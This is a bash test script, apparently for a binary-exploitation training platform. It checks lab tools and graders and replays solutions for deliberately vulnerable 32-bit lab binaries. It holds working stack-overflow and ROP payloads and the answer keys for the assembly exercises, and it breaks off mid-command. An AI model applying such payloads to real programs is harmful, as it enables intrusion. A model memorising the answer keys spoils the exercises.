#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
LAB="$ROOT/vm/labs/pwnhub/pwn-ret2win-01"
ELF="$LAB/ret2win"
READELF_TOOL="$ROOT/vm/binary-tools/staged/readelf"
NM_TOOL="$ROOT/vm/binary-tools/staged/nm"
OBJDUMP_TOOL="$ROOT/vm/binary-tools/staged/objdump"
GDB_TOOL="$ROOT/vm/binary-tools/staged/gdb"
WORK="$(mktemp -d)"
trap 'rm -rf -- "$WORK"' EXIT

case "$(uname -s)" in
    Linux) ;;
    *)
        echo '✓ binary profile static checks run on the physical host; Linux replay skipped'
        exit 0
        ;;
esac

for command_name in file hexdump readelf nm strings od sha256sum timeout python3; do
    command -v "$command_name" >/dev/null 2>&1 || {
        echo "missing Linux tool: $command_name" >&2
        exit 2
    }
done

chmod +x "$READELF_TOOL"
[ "$(sha256sum "$READELF_TOOL" | cut -d ' ' -f 1)" = \
    4f6cfab9ad21cdaa8cebbf65cd34af881f8645ce47eb2541e8c9f6a3f24cb8f7 ]
file "$READELF_TOOL" | grep -Eq 'ELF 32-bit LSB executable, Intel (80386|i386)'
file "$READELF_TOOL" | grep -Fq 'statically linked'
LC_ALL=C "$READELF_TOOL" --version | grep -Fq 'GNU readelf (GNU Binutils) 2.42'
! LC_ALL=C "$READELF_TOOL" -l "$READELF_TOOL" | grep -q INTERP

chmod +x "$NM_TOOL"
[ "$(sha256sum "$NM_TOOL" | cut -d ' ' -f 1)" = \
    608bb8aa47218aa818e08e32d85fd4baf294cb05afcf9950d4169367c408a625 ]
file "$NM_TOOL" | grep -Eq 'ELF 32-bit LSB executable, Intel (80386|i386)'
file "$NM_TOOL" | grep -Fq 'statically linked'
LC_ALL=C "$NM_TOOL" --version | grep -Fq 'GNU nm (GNU Binutils) 2.42'
! LC_ALL=C "$READELF_TOOL" -l "$NM_TOOL" | grep -q INTERP

chmod +x "$OBJDUMP_TOOL"
[ "$(sha256sum "$OBJDUMP_TOOL" | cut -d ' ' -f 1)" = \
    dd8bcd1a98c0136042cf1246d1e36153183485647b6f7e5cd676b3b915aace1b ]
file "$OBJDUMP_TOOL" | grep -Eq 'ELF 32-bit LSB executable, Intel (80386|i386)'
file "$OBJDUMP_TOOL" | grep -Fq 'statically linked'
LC_ALL=C "$OBJDUMP_TOOL" --version | grep -Fq 'GNU objdump (GNU Binutils) 2.42'
! LC_ALL=C "$READELF_TOOL" -l "$OBJDUMP_TOOL" | grep -q INTERP

chmod +x "$GDB_TOOL"
[ "$(sha256sum "$GDB_TOOL" | cut -d ' ' -f 1)" = \
    5bed8004d18a154d4358b82c4068c33e7649c02d9cdd9801e8db55dd100ae216 ]
file "$GDB_TOOL" | grep -Eq 'ELF 32-bit LSB executable, Intel (80386|i386)'
file "$GDB_TOOL" | grep -Fq 'statically linked'
file "$GDB_TOOL" | grep -Fq 'stripped'
LC_ALL=C "$GDB_TOOL" --version | grep -Fq 'GNU gdb (GDB) 15.1'
! LC_ALL=C "$READELF_TOOL" -l "$GDB_TOOL" | grep -q INTERP

# Git worktrees on Windows do not preserve executable bits for downloaded ELF files;
# normalize the copy before replaying it on Linux.
chmod +x "$ELF"
[ -x "$ELF" ]
[ "$(sha256sum "$ELF" | cut -d ' ' -f 1)" = \
    58841c68f57cd49e3ed33ec621f000cb4a1d24691f88c7ddcf0a0bdc71013068 ]
LC_ALL=C readelf -h "$ELF" | grep -q 'Intel 80386'
LC_ALL=C readelf -h "$ELF" | grep -q 'Type:[[:space:]]*EXEC'
! LC_ALL=C readelf -l "$ELF" | grep -q INTERP
LC_ALL=C readelf -l "$ELF" | grep -Eq 'GNU_STACK[^R]*RW '
LC_ALL=C nm -n "$ELF" | grep -qE '[[:space:]]T win$'
! LC_ALL=C readelf -Ws "$ELF" | grep -qE '__stack_chk_fail|execve|socket|setuid|setgid'

WIN_HEX="$(LC_ALL=C nm -n "$ELF" | awk '$3 == "win" { print $1; exit }')"
[ -n "$WIN_HEX" ] || { echo 'win symbol is missing' >&2; exit 2; }
python3 - "$WIN_HEX" "$WORK/payload.bin" <<'PY'
import struct
import sys

win, output = int(sys.argv[1], 16), sys.argv[2]
with open(output, 'wb') as stream:
    stream.write(b'A' * 68 + struct.pack('<I', win))
PY

GDB_OUTPUT="$WORK/gdb-smoke.txt"
if ! LC_ALL=C "$GDB_TOOL" -nx --batch -q "$ELF" \
    -ex 'set pagination off' \
    -ex 'break win' \
    -ex "run < $WORK/payload.bin" \
    -ex 'info registers eip esp' \
    -ex 'x/2wx $esp' \
    -ex 'backtrace' \
    -ex 'quit' > "$GDB_OUTPUT" 2>&1; then
    cat "$GDB_OUTPUT" >&2
    exit 1
fi
grep -q 'Breakpoint 1' "$GDB_OUTPUT"
grep -qi 'eip' "$GDB_OUTPUT"
grep -qi 'esp' "$GDB_OUTPUT"
grep -q 'win' "$GDB_OUTPUT"

mkdir -p "$WORK/home"
HOME="$WORK/home" bash "$LAB/reset.sh"
cp "$WORK/payload.bin" "$WORK/home/pwn-ret2win-01/payload.bin"
HOME="$WORK/home" bash "$LAB/check.sh" > "$WORK/check.txt"
grep -qx 'ret2win replay passed' "$WORK/check.txt"

printf 'wrong\n' > "$WORK/wrong.bin"
cp "$WORK/wrong.bin" "$WORK/home/pwn-ret2win-01/payload.bin"
if HOME="$WORK/home" bash "$LAB/check.sh" > "$WORK/wrong-check.txt" 2>&1; then
    echo 'wrong payload unexpectedly passed' >&2
    exit 1
fi
grep -Eq 'ELF replay did not reach the expected state|ELF output did not match the expected marker' "$WORK/wrong-check.txt"

printf 'wrong\n' > "$WORK/home/outside.bin"
if HOME="$WORK/home" bash "$LAB/check.sh" "$WORK/home/pwn-ret2win-01/../outside.bin" > "$WORK/traversal-check.txt" 2>&1; then
    echo 'path traversal unexpectedly passed' >&2
    exit 1
fi
grep -q 'payload path traversal is not allowed' "$WORK/traversal-check.txt"

printf '%*s' 513 '' | tr ' ' A > "$WORK/home/pwn-ret2win-01/payload.bin"
if HOME="$WORK/home" bash "$LAB/check.sh" > "$WORK/large-check.txt" 2>&1; then
    echo 'oversized payload unexpectedly passed' >&2
    exit 1
fi
grep -q 'payload exceeds the 512 byte limit' "$WORK/large-check.txt"

HOME="$WORK/home" bash "$LAB/reset.sh"
[ ! -e "$WORK/home/pwn-ret2win-01/payload.bin" ]

echo '==> 栈溢出与基础 ROP 样本重放'
pwn_replay() {
    lab_id=$1
    binary=$2
    expected_sha256=$3
    correct_spec=$4
    wrong_spec=$5
    marker=$6
    lab_root="$ROOT/vm/labs/pwnhub/$lab_id"
    elf="$lab_root/$binary"
    chmod +x "$elf" "$lab_root"/*.sh
    [ "$(sha256sum "$elf" | cut -d ' ' -f 1)" = "$expected_sha256" ]
    [ -x "$elf" ]
    HOME="$WORK/home" bash "$lab_root/reset.sh"
    python3 - "$WORK/home/$lab_id" "$wrong_spec" "$correct_spec" <<'PY'
import struct
import sys

wrong = eval(sys.argv[2], {'A': b'A', 'p32': lambda value: struct.pack('<I', value)})
correct = eval(sys.argv[3], {'A': b'A', 'p32': lambda value: struct.pack('<I', value)})
open(f"{sys.argv[1]}/payload.bin", 'wb').write(wrong)
PY
    if HOME="$WORK/home" bash "$lab_root/check.sh" > "$WORK/pwn-wrong.txt" 2>&1; then
        echo "$lab_id wrong payload unexpectedly passed" >&2
        exit 1
    fi
    grep -Eq 'replay did not reach|output did not match|没看到' "$WORK/pwn-wrong.txt"
    python3 - "$WORK/home/$lab_id" "$correct_spec" <<'PY'
import struct
import sys

correct = eval(sys.argv[2], {'A': b'A', 'p32': lambda value: struct.pack('<I', value)})
open(f"{sys.argv[1]}/payload.bin", 'wb').write(correct)
PY
    HOME="$WORK/home" bash "$lab_root/check.sh" > "$WORK/pwn-ok.txt"
    grep -q "$marker" "$WORK/pwn-ok.txt"
    if HOME="$WORK/home" bash "$lab_root/check.sh" "$WORK/home/$lab_id/../outside.bin" \
        > "$WORK/pwn-traversal.txt" 2>&1; then
        echo "$lab_id path traversal unexpectedly passed" >&2
        exit 1
    fi
    grep -q 'payload path traversal is not allowed' "$WORK/pwn-traversal.txt"
    printf '%*s' 513 '' | tr ' ' A > "$WORK/home/$lab_id/payload.bin"
    if HOME="$WORK/home" bash "$lab_root/check.sh" > "$WORK/pwn-large.txt" 2>&1; then
        echo "$lab_id oversized payload unexpectedly passed" >&2
        exit 1
    fi
    grep -q 'payload exceeds the 512 byte limit' "$WORK/pwn-large.txt"
    HOME="$WORK/home" bash "$lab_root/reset.sh"
    [ ! -e "$WORK/home/$lab_id/payload.bin" ]
    echo "  ✓ $lab_id 正确/错误/穿越/超限重放与重置"
}

pwn_replay pwn-ret2win-args-01 ret2win-args \
    757ea0ddd6898723df8e48bc1d26b40aa0b68d558b96a562c9b5d1c2e8715559 \
    "b'A'*68+p32(0x08049020)+p32(0)+p32(0x13572468)+p32(0x24681357)" \
    "b'A'*68+p32(0x08049020)+p32(0)+p32(0x24681357)+p32(0x13572468)" \
    'pwn ret2win args replay passed'
pwn_replay rop-gadget-stack-01 rop-gadget-stack \
    afafd14863bef2ac862d2e9733f3fe83ec40701c76bff535a587ea2f334166ac \
    "b'A'*68+p32(0x08049020)+p32(0x4b434154)+p32(0x08049025)+p32(0)" \
    "b'A'*68+p32(0x08049020)+p32(0x4b434155)+p32(0x08049025)+p32(0)" \
    'rop gadget stack replay passed'
pwn_replay rop-register-chain-01 rop-register-chain \
    4c35a71d070be92dfb8fb4f7be56161dcb37acaf88059fe5bea1099f940e5eeb \
    "b'A'*68+p32(0x08049020)+p32(0x11112222)+p32(0x08049025)+p32(0x33334444)+p32(0x0804902a)" \
    "b'A'*68+p32(0x08049020)+p32(0x33334444)+p32(0x08049025)+p32(0x11112222)+p32(0x0804902a)" \
    'rop register chain replay passed'
pwn_replay rop-call-chain-01 rop-call-chain \
    4c07a9d5ffe1440ce43423780ab2b94744e9fd044bb8d60a4cf86201154e69eb \
    "b'A'*68+p32(0x08049020)+p32(0x08049030)+p32(0x0804904a)" \
    "b'A'*68+p32(0x08049030)+p32(0x08049020)+p32(0x0804904a)" \
    'rop call chain replay passed'

echo '==> 覆盖偏移样本 GDB 重放'
OFFSET_LAB="$ROOT/vm/labs/pwnhub/pwn-overflow-offset-01"
OFFSET_ELF="$OFFSET_LAB/overflow-offset"
chmod +x "$OFFSET_ELF" "$OFFSET_LAB"/*.sh
[ "$(sha256sum "$OFFSET_ELF" | cut -d ' ' -f 1)" = \
    381972c7fab3c613cbd6503a51104a3eba9cca11036800484b830d4050b30333 ]
HOME="$WORK/home" bash "$OFFSET_LAB/reset.sh"
python3 - "$WORK/home/pwn-overflow-offset-01" <<'PY'
import sys

open(f"{sys.argv[1]}/payload.bin", 'wb').write(b'A' * 68 + b'BBBB')
PY
HOME="$WORK/home" PWNHUB_GDB="$GDB_TOOL" bash "$OFFSET_LAB/check.sh" > "$WORK/offset-check.txt"
grep -qx 'pwn overflow offset replay passed' "$WORK/offset-check.txt"
python3 - "$WORK/home/pwn-overflow-offset-01" <<'PY'
import sys

open(f"{sys.argv[1]}/payload.bin", 'wb').write(b'A' * 67 + b'BBBB')
PY
if HOME="$WORK/home" PWNHUB_GDB="$GDB_TOOL" bash "$OFFSET_LAB/check.sh" \
    > "$WORK/offset-wrong.txt" 2>&1; then
    echo 'wrong overflow offset payload unexpectedly passed' >&2
    exit 1
fi
grep -Eq '没看到' "$WORK/offset-wrong.txt"
HOME="$WORK/home" bash "$OFFSET_LAB/reset.sh"
[ ! -e "$WORK/home/pwn-overflow-offset-01/payload.bin" ]
echo '  ✓ pwn-overflow-offset-01 真实 GDB 重放与错误偏移拒绝'

MEMORY_LAB="$ROOT/vm/labs/pwnhub/memory-addresses-01"
MEMORY_ELF="$MEMORY_LAB/memory-addresses"
chmod +x "$MEMORY_ELF"
[ "$(sha256sum "$MEMORY_ELF" | cut -d ' ' -f 1)" = \
    ef9beb6b8c9ce744d867d9df12983fe74dc5847c7aff223f000a59d88ad303b8 ]
MEMORY_OUTPUT="$($MEMORY_ELF)"
MEMORY_ADDRESS="$(printf '%s\n' "$MEMORY_OUTPUT" | awk -F '|' '$2 ~ /cell/ { for (i = 1; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); if ($2 == "cell") { print $1; exit } }')"
MEMORY_VALUE="$(printf '%s\n' "$MEMORY_OUTPUT" | awk -F '|' '$2 ~ /cell/ { for (i = 1; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); if ($2 == "cell") { print $3; exit } }')"
MEMORY_POINTER="$(printf '%s\n' "$MEMORY_OUTPUT" | awk -F '|' '$2 ~ /cell_pointer/ { for (i = 1; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); if ($2 == "cell_pointer") { print $3; exit } }')"
MEMORY_SIGNED="$(printf '%s\n' "$MEMORY_OUTPUT" | awk -F '|' '$2 ~ /signed_cell/ { for (i = 1; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); print $3; exit }')"
MEMORY_TARGET="$(printf '%s\n' "$MEMORY_OUTPUT" | awk -F '|' '$2 ~ /\*cell_pointer/ { for (i = 1; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); print $3; exit }')"
[ "$MEMORY_ADDRESS" = 0x0804b140 ]
[ "$MEMORY_VALUE" = 0xdec0de42 ]
[ "$MEMORY_POINTER" = 0x0804b140 ]
[ "$MEMORY_SIGNED" = -42 ]
[ "$MEMORY_TARGET" = "$MEMORY_VALUE" ]
HOME="$WORK/home" bash "$MEMORY_LAB/reset.sh"
HOME="$WORK/home" bash "$MEMORY_LAB/check.sh" \
    "$MEMORY_ADDRESS" "$MEMORY_VALUE" "$MEMORY_POINTER" "$MEMORY_SIGNED" \
    > "$WORK/memory-check.txt"
grep -qx 'memory-addresses replay passed' "$WORK/memory-check.txt"
if HOME="$WORK/home" bash "$MEMORY_LAB/check.sh" \
    "$MEMORY_ADDRESS" "$MEMORY_VALUE" "$MEMORY_POINTER" 42 \
    > "$WORK/memory-wrong.txt" 2>&1; then
    echo 'wrong signed memory answer unexpectedly passed' >&2
    exit 1
fi

MEMORY_LAYOUT_LAB="$ROOT/vm/labs/pwnhub/memory-layout-01"
MEMORY_LAYOUT_SCRIPT="$MEMORY_LAYOUT_LAB/inspect-memory-layout.sh"
chmod +x "$MEMORY_LAYOUT_LAB"/*.sh
[ "$(sha256sum "$MEMORY_LAYOUT_SCRIPT" | cut -d ' ' -f 1)" = \
    94a06311f6e006788bff713217216cc3b3b9c7ac064a651927f35219841ff2a7 ]
! grep -Fq '/bin/busybox' "$MEMORY_LAYOUT_SCRIPT"
MEMORY_LAYOUT_OUTPUT="$($MEMORY_LAYOUT_SCRIPT)"
layout_permission() {
    printf '%s\n' "$MEMORY_LAYOUT_OUTPUT" | awk -F '|' -v region="$1" '
        $1 ~ region { gsub(/^[ \t]+|[ \t]+$/, "", $3); print $3; exit }
    '
}
LAYOUT_CODE_PERMISSION="$(layout_permission '代码段')"
LAYOUT_DATA_PERMISSION="$(layout_permission '数据段')"
LAYOUT_HEAP_PERMISSION="$(layout_permission '堆')"
LAYOUT_STACK_PERMISSION="$(layout_permission '栈')"
[ "$LAYOUT_CODE_PERMISSION" = 'r-x' ]
[ "$LAYOUT_DATA_PERMISSION" = 'rw-' ]
[ "$LAYOUT_HEAP_PERMISSION" = 'rw-' ]
[ "$LAYOUT_STACK_PERMISSION" = 'rw-' ]
HOME="$WORK/home" bash "$MEMORY_LAYOUT_LAB/reset.sh"
HOME="$WORK/home" bash "$MEMORY_LAYOUT_LAB/check.sh" \
    "$LAYOUT_CODE_PERMISSION" "$LAYOUT_DATA_PERMISSION" \
    "$LAYOUT_HEAP_PERMISSION" "$LAYOUT_STACK_PERMISSION" \
    > "$WORK/memory-layout-check.txt"
grep -qx 'memory-layout replay passed' "$WORK/memory-layout-check.txt"
if HOME="$WORK/home" bash "$MEMORY_LAYOUT_LAB/check.sh" \
    'rwx' "$LAYOUT_DATA_PERMISSION" "$LAYOUT_HEAP_PERMISSION" "$LAYOUT_STACK_PERMISSION" \
    > "$WORK/memory-layout-wrong.txt" 2>&1; then
    echo 'wrong memory layout permission unexpectedly passed' >&2
    exit 1
fi

MEMORY_REGISTER_STACK_LAB="$ROOT/vm/labs/pwnhub/memory-register-stack-01"
MEMORY_REGISTER_STACK_ELF="$MEMORY_REGISTER_STACK_LAB/memory-register-stack"
chmod +x "$MEMORY_REGISTER_STACK_ELF"
[ "$(sha256sum "$MEMORY_REGISTER_STACK_ELF" | cut -d ' ' -f 1)" = \
    39088feedfa54f33289fd875a5ccd7a8094a5e17a239f1122928243c55a1e74a ]
MEMORY_REGISTER_STACK_OUTPUT="$($MEMORY_REGISTER_STACK_ELF)"
stack_field() {
    printf '%s\n' "$MEMORY_REGISTER_STACK_OUTPUT" | awk -F '|' -v stage="$1" -v field="$2" '
        { gsub(/^[ \t]+|[ \t]+$/, "", $1) }
        $1 == stage { for (i = 2; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); print $field; exit }
    '
}
TRANSFER_STACK_ADDRESS="$(stack_field '第二个值入栈后' 2)"
TRANSFER_FIRST_REMOVED="$(stack_field '第一次出栈后' 4)"
TRANSFER_NEXT_TOP="$(stack_field '第一次出栈后' 3)"
TRANSFER_SECOND_REMOVED="$(stack_field '第二次出栈后' 4)"
[ "$TRANSFER_STACK_ADDRESS" = 0x0804c158 ]
[ "$TRANSFER_FIRST_REMOVED" = 0x22222222 ]
[ "$TRANSFER_NEXT_TOP" = 0x11111111 ]
[ "$TRANSFER_SECOND_REMOVED" = 0x11111111 ]
HOME="$WORK/home" bash "$MEMORY_REGISTER_STACK_LAB/reset.sh"
HOME="$WORK/home" bash "$MEMORY_REGISTER_STACK_LAB/check.sh" \
    "$TRANSFER_STACK_ADDRESS" "$TRANSFER_FIRST_REMOVED" "$TRANSFER_NEXT_TOP" "$TRANSFER_SECOND_REMOVED" \
    > "$WORK/memory-register-stack-check.txt"
grep -qx 'memory-register-stack replay passed' "$WORK/memory-register-stack-check.txt"
if HOME="$WORK/home" bash "$MEMORY_REGISTER_STACK_LAB/check.sh" \
    0x0804c15c "$TRANSFER_FIRST_REMOVED" "$TRANSFER_NEXT_TOP" "$TRANSFER_SECOND_REMOVED" \
    > "$WORK/memory-register-stack-wrong.txt" 2>&1; then
    echo 'wrong memory register stack answer unexpectedly passed' >&2
    exit 1
fi

ASM_LAB="$ROOT/vm/labs/pwnhub/asm-registers-01"
ASM_ELF="$ASM_LAB/asm-registers"
chmod +x "$ASM_ELF"
[ "$(sha256sum "$ASM_ELF" | cut -d ' ' -f 1)" = \
    66bc1629d0e30810add25434272188290a6ab19db76432dbba5de2e1b9aaa4e1 ]
ASM_OUTPUT="$($ASM_ELF)"
asm_operation_field() {
    printf '%s\n' "$ASM_OUTPUT" | awk -F '|' -v operation="$1" -v field="$2" '
        $1 ~ /操作/ {
            for (i = 1; i <= 6; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i)
            if ($2 == operation) { print $field; exit }
        }
    '
}
ASM_MOV_BEFORE="$(asm_operation_field mov 5)"
ASM_MOV_AFTER="$(asm_operation_field mov 6)"
ASM_LEA_AFTER="$(asm_operation_field lea 6)"
ASM_STACK_REGISTER="$(printf '%s\n' "$ASM_OUTPUT" | awk -F '|' '
    $1 ~ /职责/ {
        for (i = 1; i <= 3; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i)
        if ($3 ~ /栈顶/) { print $2; exit }
    }
')"
[ "$ASM_MOV_BEFORE" = 0x00000000 ]
[ "$ASM_MOV_AFTER" = 0x11223344 ]
[ "$ASM_LEA_AFTER" = 0x0000100c ]
[ "$ASM_STACK_REGISTER" = ESP ]
HOME="$WORK/home" bash "$ASM_LAB/reset.sh"
HOME="$WORK/home" bash "$ASM_LAB/check.sh" \
    "$ASM_MOV_AFTER" "$ASM_LEA_AFTER" "$ASM_STACK_REGISTER" \
    > "$WORK/asm-check.txt"
grep -qx 'asm-registers replay passed' "$WORK/asm-check.txt"
if HOME="$WORK/home" bash "$ASM_LAB/check.sh" \
    "$ASM_MOV_AFTER" 0x00001008 "$ASM_STACK_REGISTER" \
    > "$WORK/asm-wrong.txt" 2>&1; then
    echo 'wrong lea result unexpectedly passed' >&2
    exit 1
fi
if grep -Fq '0x0000100c' "$WORK/asm-wrong.txt"; then
    echo 'wrong register feedback leaked the expected lea result' >&2
    exit 1
fi

ARITHMETIC_LAB="$ROOT/vm/labs/pwnhub/asm-arithmetic-01"
ARITHMETIC_ELF="$ARITHMETIC_LAB/asm-arithmetic"
chmod +x "$ARITHMETIC_ELF"
[ "$(sha256sum "$ARITHMETIC_ELF" | cut -d ' ' -f 1)" = \
    8c30413bbc6fa5a4a76c1834b0cf43f49a4421c687f80a7a60a3d7a26bd1ac5c ]
ARITHMETIC_OUTPUT="$($ARITHMETIC_ELF)"
arithmetic_value() {
    printf '%s\n' "$ARITHMETIC_OUTPUT" | awk -F '|' -v instruction="$1" '
        {
            for (i = 1; i <= 4; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i)
            if ($2 == instruction) { print $4; exit }
        }
    '
}
ARITHMETIC_SUB="$(arithmetic_value 'sub eax, 4')"
ARITHMETIC_MUL="$(arithmetic_value 'imul eax, ebx')"
ARITHMETIC_QUOTIENT="$(arithmetic_value 'idiv ebx')"
ARITHMETIC_REMAINDER="$(arithmetic_value 'idiv 后的 EDX')"
ARITHMETIC_XOR="$(arithmetic_value 'xor eax, 0x11')"
[ "$(arithmetic_value 'add eax, 7')" = 0x00000011 ]
[ "$ARITHMETIC_SUB" = 0x0000000d ]
[ "$ARITHMETIC_MUL" = 0x0000002a ]
[ "$ARITHMETIC_QUOTIENT" = 0x00000008 ]
[ "$ARITHMETIC_REMAINDER" = 0x00000003 ]
[ "$(arithmetic_value 'and eax, 0x3c')" = 0x00000030 ]
[ "$(arithmetic_value 'or eax, 0x03')" = 0x00000033 ]
[ "$ARITHMETIC_XOR" = 0x00000022 ]
HOME="$WORK/home" bash "$ARITHMETIC_LAB/reset.sh"
HOME="$WORK/home" bash "$ARITHMETIC_LAB/check.sh" \
    "$ARITHMETIC_SUB" "$ARITHMETIC_MUL" "$ARITHMETIC_QUOTIENT" \
    "$ARITHMETIC_REMAINDER" "$ARITHMETIC_XOR" \
    > "$WORK/arithmetic-check.txt"
grep -qx 'asm-arithmetic replay passed' "$WORK/arithmetic-check.txt"
if HOME="$WORK/home" bash "$ARITHMETIC_LAB/check.sh" \
    "$ARITHMETIC_SUB" "$ARITHMETIC_MUL" "$ARITHMETIC_QUOTIENT" \
    0x00000004 "$ARITHMETIC_XOR" \
    > "$WORK/arithmetic-wrong.txt" 2>&1; then
    echo 'wrong division remainder unexpectedly passed' >&2
    exit 1
fi
if grep -Fq '0x00000003' "$WORK/arithmetic-wrong.txt"; then
    echo 'wrong arithmetic feedback leaked the expected remainder' >&2
    exit 1
fi

STACK_OPS_LAB="$ROOT/vm/labs/pwnhub/asm-stack-ops-01"
STACK_OPS_ELF="$STACK_OPS_LAB/asm-stack-ops"
chmod +x "$STACK_OPS_ELF"
[ "$(sha256sum "$STACK_OPS_ELF" | cut -d ' ' -f 1)" = \
    bd3b56a443f0059f57bd3af13f9e0ca1b2fe4ee6ebff60b64cefb9d57e398dbb ]
STACK_OPS_OUTPUT="$($STACK_OPS_ELF)"
stack_ops_field() {
    printf '%s\n' "$STACK_OPS_OUTPUT" | awk -F '|' -v instruction="$1" -v field="$2" '
        {
            for (i = 1; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i)
            if ($1 == instruction) { print $field; exit }
        }
    '
}
FIRST_PUSH_ESP="$(stack_ops_field 'push 0x11111111' 2)"
SECOND_PUSH_ESP="$(stack_ops_field 'push 0x22222222' 2)"
FIRST_POP_VALUE="$(stack_ops_field 'pop eax' 5)"
SECOND_POP_VALUE="$(stack_ops_field 'pop ebx' 5)"
[ "$(stack_ops_field '开始' 2)" = 0x0804c0e0 ]
[ "$FIRST_PUSH_ESP" = 0x0804c0dc ]
[ "$SECOND_PUSH_ESP" = 0x0804c0d8 ]
[ "$(stack_ops_field 'pop eax' 2)" = 0x0804c0dc ]
[ "$(stack_ops_field 'pop ebx' 2)" = 0x0804c0e0 ]
[ "$FIRST_POP_VALUE" = 0x22222222 ]
[ "$SECOND_POP_VALUE" = 0x11111111 ]
HOME="$WORK/home" bash "$STACK_OPS_LAB/reset.sh"
HOME="$WORK/home" bash "$STACK_OPS_LAB/check.sh" \
    "$FIRST_PUSH_ESP" "$SECOND_PUSH_ESP" "$FIRST_POP_VALUE" "$SECOND_POP_VALUE" \
    > "$WORK/stack-ops-check.txt"
grep -qx 'asm-stack-ops replay passed' "$WORK/stack-ops-check.txt"
if HOME="$WORK/home" bash "$STACK_OPS_LAB/check.sh" \
    "$FIRST_PUSH_ESP" "$SECOND_PUSH_ESP" "$SECOND_POP_VALUE" "$FIRST_POP_VALUE" \
    > "$WORK/stack-ops-wrong.txt" 2>&1; then
    echo 'wrong pop order unexpectedly passed' >&2
    exit 1
fi

BRANCHES_LAB="$ROOT/vm/labs/pwnhub/asm-branches-01"
BRANCHES_ELF="$BRANCHES_LAB/asm-branches"
chmod +x "$BRANCHES_ELF"
[ "$(sha256sum "$BRANCHES_ELF" | cut -d ' ' -f 1)" = \
    14b3db09dacc71c4ced0e2a81a5408ca7b3794e44ee56f20f62a24c35ceaa6bb ]
BRANCHES_OUTPUT="$($BRANCHES_ELF)"
branch_row() {
    printf '%s\n' "$BRANCHES_OUTPUT" | awk -F '|' -v name="$1" '
        {
            for (i = 1; i <= 8; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i)
            if ($1 == name) { print $2 "," $3 "," $4 "," $5 "," $6 "," $7 "," $8; exit }
        }
    '
}
[ "$(branch_row '零值检测')" = 'test eax,eax; je,0x00000000,0x00000000,1,0,0,是' ]
[ "$(branch_row '相等比较')" = 'cmp eax,ebx; je,0x00000007,0x00000007,1,0,0,是' ]
[ "$(branch_row '有符号大于')" = 'cmp eax,ebx; jg,0x00000009,0x00000003,0,0,0,是' ]
HOME="$WORK/home" bash "$BRANCHES_LAB/reset.sh"
HOME="$WORK/home" bash "$BRANCHES_LAB/check.sh" \
    1 1 1 ZF SF=OF \
    > "$WORK/branches-check.txt"
grep -qx 'asm-branches replay passed' "$WORK/branches-check.txt"
if HOME="$WORK/home" bash "$BRANCHES_LAB/check.sh" \
    1 1 0 ZF SF=OF \
    > "$WORK/branches-wrong.txt" 2>&1; then
    echo 'wrong signed branch result unexpectedly passed' >&2
    exit 1
fi

CALL_STACK_LAB="$ROOT/vm/labs/pwnhub/asm-call-stack-01"
CALL_STACK_ELF="$CALL_STACK_LAB/asm-call-stack"
chmod +x "$CALL_STACK_ELF"
[ "$(sha256sum "$CALL_STACK_ELF" | cut -d ' ' -f 1)" = \
    1fd5e07c8b83e5d681164dde7ab590c50a1b8028c26b9405d9304279913de5c0 ]
CALL_STACK_OUTPUT="$($CALL_STACK_ELF)"
RETURN_ADDRESS="$(printf '%s\n' "$CALL_STACK_OUTPUT" | awk -F '|' '$1 ~ /stack/ { for (i = 1; i <= 4; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); if ($3 ~ /返回地址/) { print $4; exit } }')"
ARGUMENT_VALUE="$(printf '%s\n' "$CALL_STACK_OUTPUT" | awk -F '|' '$1 ~ /stack/ { for (i = 1; i <= 4; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); if ($3 ~ /参数/) { print $4; exit } }')"
LOCAL_VALUE="$(printf '%s\n' "$CALL_STACK_OUTPUT" | awk -F '|' '$1 ~ /stack/ { for (i = 1; i <= 4; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); if ($3 ~ /局部变量/) { print $4; exit } }')"
RETURNED_ESP="$(printf '%s\n' "$CALL_STACK_OUTPUT" | awk -F '|' '$1 ~ /阶段/ { for (i = 1; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); if ($2 == "返回") { print $3; exit } }')"
CLEANUP_ESP="$(printf '%s\n' "$CALL_STACK_OUTPUT" | awk -F '|' '$1 ~ /阶段/ { for (i = 1; i <= 5; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i); if ($2 == "清理") { print $3; exit } }')"
RETURN_VALUE="$(printf '%s\n' "$CALL_STACK_OUTPUT" | awk -F '|' '$1 ~ /结果/ { gsub(/^[ \t]+|[ \t]+$/, "", $2); print $2; exit }')"
[ "$RETURN_ADDRESS" = 0x08049081 ]
[ "$ARGUMENT_VALUE" = 0x00000015 ]
[ "$LOCAL_VALUE" = 0x0000002b ]
[ "$RETURNED_ESP" = 0x0804c24c ]
[ "$CLEANUP_ESP" = 0x0804c250 ]
[ "$RETURN_VALUE" = 0x0000002b ]
HOME="$WORK/home" bash "$CALL_STACK_LAB/reset.sh"
HOME="$WORK/home" bash "$CALL_STACK_LAB/check.sh" \
    "$RETURN_ADDRESS" "$ARGUMENT_VALUE" "$LOCAL_VALUE" 4 "$RETURN_VALUE" \
    > "$WORK/call-stack-check.txt"
grep -qx 'asm-call-stack replay passed' "$WORK/call-stack-check.txt"
if HOME="$WORK/home" bash "$CALL_STACK_LAB/check.sh" \
    "$RETURN_ADDRESS" "$ARGUMENT_VALUE" 0x0000002a 4 "$RETURN_VALUE" \
    > "$WORK/call-stack-wrong.txt" 2>&1; then
    echo 'wrong call stack local value unexpectedly passed' >&2
    exit 1
fi
if HOME="$WORK/home" bash "$CALL_STACK_LAB/check.sh" \
    "$RETURN_ADDRESS" "$ARGUMENT_VALUE" "$LOCAL_VALUE" 8 "$RETURN_VALUE" \
